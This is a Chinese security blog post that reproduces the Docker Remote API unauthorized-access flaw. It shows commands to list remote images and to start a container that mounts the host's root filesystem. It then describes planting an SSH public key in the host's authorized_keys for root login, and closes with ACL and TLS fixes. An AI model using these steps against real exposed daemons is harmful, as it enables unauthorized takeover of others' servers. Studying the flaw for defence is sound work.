> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DqOcU6iz0BABvoa6AKYHfQ)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7h4PibFD8ULJmUSg2Opp9zbf9TiccicszSnSlBKRK35x0ibK1DAUfC9Qb2fA/640?wx_fmt=jpeg)

**前言:**

Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。

Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。

容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）, 更重要的是容器性能开销极低。

**漏洞描述:**

通过 docker 未收取访问漏洞，在利用 docker remote api 可以执行 docker 命令，从官方文档可以看出，该接口是目的是取代 docker 命令界面，通过 url 操作 docker。

**漏洞复现：**

访问 version

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7hDJ4aU0HJAMQibibFz7jOar39Q9dhslhgQib1tzbsmCnKBicEicTzLCUf4UQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7hMqou5T9MANcziaSRbDiaZnPIPfB9qBhCOLcLwXmcPeaqMJt7HOIicIlNg/640?wx_fmt=png)

docker  -H 远程列出容器。

docker  -H tcp://ip:port images

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7hRrcGXoMeaGOISerFvwfgogvPYhosjiaZRJQUnFNvbzQh7oylqQx0Yxw/640?wx_fmt=png)

获取 IMAGE ID 进入容器，并挂载攻击主机的目录（任意目录）。

```
docker -H tcp://ip:port  run -it -v /:/mnt c203892a8124  /bin/bash
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7hhNYqYSsMt8pww8bczdRKe3ZxwDyISvegSqJNs771l0NKNc9VsTiaDGw/640?wx_fmt=png)

免密 ssh 登陆。使用 ssh-keygen 默认即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7hDhYibuUHXAPGb78pVnPCH384rFxXeZdqOTUicibWzVUsBZlaNA2mHaxwA/640?wx_fmt=png)

生成两个文件，/root/.ssh/id_rsa.pub 公钥存储文件，/root/.ssh/id_rsa 私钥存储文件，将公钥文件写入到攻击机的 authorized_keys 文件下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7h6gs9My1xnzdmTy1tTtm8QiakqQJtAWH7scYqXeEqUvhTCuj3wffVDEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7hia8DMuVLpffcSxdMtPjUDzicIcVicibIOtK29cIve02FkNeIQLtaolqzcQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7hNaoOLDk55f8U3PZWjMGSicYfU65TYUQPCQIfhEhKjuCS92UhZkOviaEg/640?wx_fmt=png)

登陆 ssh。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27uzOYNSqqckxtdhPJCKb7h3XibiaibYsYTaHvXia1IOsj0GQzOaAhuC5HLK83untkQsDm4xN4Ivs8eKw/640?wx_fmt=png)

**影响版本：**

所有版本。

****修复建议:****

1、设置 ACL，只允许信任 ip 连接对应端口；

2、开启 TLS，使用生成的证书进行认证。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa260lZABWwEo49lodRtpGIOoYYt5Ojm4Y1sdMD4ez7rL55g1IW3icCTOia91YicOrh1sjuOB5TiaUibCiaiaA/640?wx_fmt=jpeg)

一起学习，请关注我![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4hZQYrCwcz8gD1evatvHgAquT3YhfNMxgqib63eQ1mRnQVjQA6W9icxFg/640?wx_fmt=png)

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。